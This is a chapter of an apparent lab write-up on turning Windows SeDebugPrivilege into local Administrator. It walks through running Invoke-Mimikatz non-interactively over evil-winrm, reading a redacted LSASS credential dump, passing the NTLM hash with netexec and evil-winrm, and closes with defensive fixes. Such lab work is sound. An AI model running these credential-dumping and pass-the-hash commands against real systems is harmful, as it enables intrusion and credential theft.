# 03 — `SeDebugPrivilege` → local Administrator

No kernel exploit, no unquoted service path, no misconfigured ACL. The account is allowed to debug
processes, `lsass.exe` is a process, and `lsass.exe` holds every credential on the machine.

## 3.1 Why Mimikatz needs `SeDebugPrivilege`

`lsass.exe` runs as `SYSTEM` and is protected: opening it with `PROCESS_VM_READ` requires
`SeDebugPrivilege`. Mimikatz's first command is therefore always:

```text
privilege::debug
```

If the token has the privilege, this returns `Privilege '20' OK`; if it does not, every later command
fails with access denied. That single line tells you whether the box is over.

## 3.2 The WinRM problem

Mimikatz is normally run interactively: start it, get a `mimikatz #` prompt, type commands. Over
`evil-winrm` there is no interactive console — the session is a remote PowerShell pipeline, and a
program that expects a terminal simply does not start. `mimikatz.exe` prints its banner and exits, and
`Invoke-Mimikatz` without arguments does nothing useful.

Mimikatz accepts commands as arguments instead, which is the workaround:

```powershell
.\Invoke-Mimikatz.ps1 "privilege::debug" "sekurlsa::logonpasswords"
```

Each quoted argument is executed in order, exactly as if it had been typed at the `mimikatz #` prompt,
and the output is returned to the PowerShell session. This is the technique that makes Mimikatz usable
in *any* non-interactive context: WinRM, a webshell, a scheduled task, a `psexec` one-liner.

> Upload `Invoke-Mimikatz.ps1` first — `upload /opt/tools/Invoke-Mimikatz.ps1 .` from the evil-winrm
> prompt — then invoke it from the current directory.

```powershell
*Evil-WinRM* PS C:\Users\p.andrew\Documents> upload /opt/tools/Invoke-Mimikatz.ps1 .
*Evil-WinRM* PS C:\Users\p.andrew\Documents> .\Invoke-Mimikatz.ps1 "privilege::debug" "sekurlsa::logonpasswords"
```

## 3.3 The dump

```text
  .#####.   mimikatz 2.2.0 (x64) #19041 Jul 17 2021 14:08:44
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 202309 (00000000:000316c5)
Session           : RemoteInteractive from 2
User Name         : p.andrew
Domain            : OSCP
Logon Server      : SRV22
Logon Time        : 2026-07-16 12:42:08 PM
SID               : S-1-5-21-[redacted]

        msv :
         [00000003] Primary
         * Username : p.andrew
         * Domain   : OSCP
         * NTLM     : [redacted]
         * SHA1     : [redacted]
        tspkg :
        wdigest :
         * Username : p.andrew
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : p.andrew
         * Domain   : OSCP.EXAM
         * Password : (null)

Authentication Id : 0 ; 721948 (00000000:000b041c)
Session           : Batch from 0
User Name         : Administrator
Domain            : WS26
Logon Server      : WS26
Logon Time        : 2026-07-16 6:48:48 AM
SID               : S-1-5-21-[redacted]

        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WS26
         * NTLM     : [redacted]
         * SHA1     : [redacted]
        wdigest :
         * Username : Administrator
         * Domain   : WS26
         * Password : (null)
```

Two accounts, two very different values:

| Account | Realm | Value to the attacker |
|---|---|---|
| `p.andrew` | `OSCP` | the credential already in hand — nothing new |
| `Administrator` | `WS26` | **the local Administrator of this machine**, as an NTLM hash |

`Domain : WS26` is the giveaway: that is not the AD domain, it is the computer name, which is how
Windows labels a *local* account. The hash is a local administrator hash, not a domain one — it opens
this machine and nothing else.

The `Batch from 0` session is the one that matters. A batch logon means a service or scheduled task is
running as the local Administrator, so the credential is sitting in LSASS even when nobody is logged
in interactively.

## 3.4 Pass-the-hash to local Administrator

The hash is enough; the plaintext never needs to be recovered.

```bash
nxc winrm 172.16.97.206 -u Administrator -H '[redacted]' --local-auth
```

```text
WINRM       172.16.97.206   5985   WS26    [*] Windows Server 2019 Build 17763 (name:WS26)
WINRM       172.16.97.206   5985   WS26    [+] WS26\Administrator:[redacted] (Pwn3d!)
```

`--local-auth` is the important flag: without it, netexec authenticates `Administrator` against the
*domain*, where the account either does not exist or has a different password. With it, the hash is
checked against the local SAM — which is exactly where it came from.

```bash
evil-winrm -i 172.16.97.206 -u Administrator -H '[redacted]'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ws26\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
WS26
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\local.txt
[redacted]
```

## 3.5 The local flag

| Host | File | Value |
|---|---|---|
| `WS26` | `C:\Users\Administrator\Desktop\local.txt` | `[redacted]` |

That is the machine's half of the box. The domain half — `proof.txt` on `SRV22` — needs a domain
administrator, and the rest of this lab is the search for one.

```powershell
# find both flags wherever they were left
Get-ChildItem C:\ -Recurse -Include proof.txt,local.txt -ErrorAction SilentlyContinue |
    ForEach-Object { $_.FullName; Get-Content $_.FullName }
```

## 3.6 What this buys

| Capability | Why it matters |
|---|---|
| Read every local file | configuration, scripts, notes, saved RDP sessions |
| Install a service / run a binary as `SYSTEM` | a stable agent instead of a fragile shell |
| Use the machine as a network position | the member server can reach the DC that Kali cannot |
| Dump local secrets | local accounts reused elsewhere, service passwords |

The pivot is the next chapter, and it is the reason this escalation matters: `WS26` can see a network
the attacker cannot.

## 3.7 Why the box is built this way

The privilege is not a bug in the application — it is an assignment. Somebody put `p.andrew` (or a
group it belongs to) in a policy that grants `SeDebugPrivilege`, probably to make some monitoring or
backup tool work. That is a realistic misconfiguration and a very common one: the account is not an
administrator, it just carries one attribute administrators have.

The defensive fix is unglamorous: audit `SeDebugPrivilege`, `SeImpersonatePrivilege` and
`SeBackupPrivilege` assignments, and remember that any of them is equivalent to local admin. Then
enable LSASS protection (RunAsPPL) so that even a debug privilege cannot read the dump.

---

**Next:** [`04-pivot.md`](04-pivot.md)
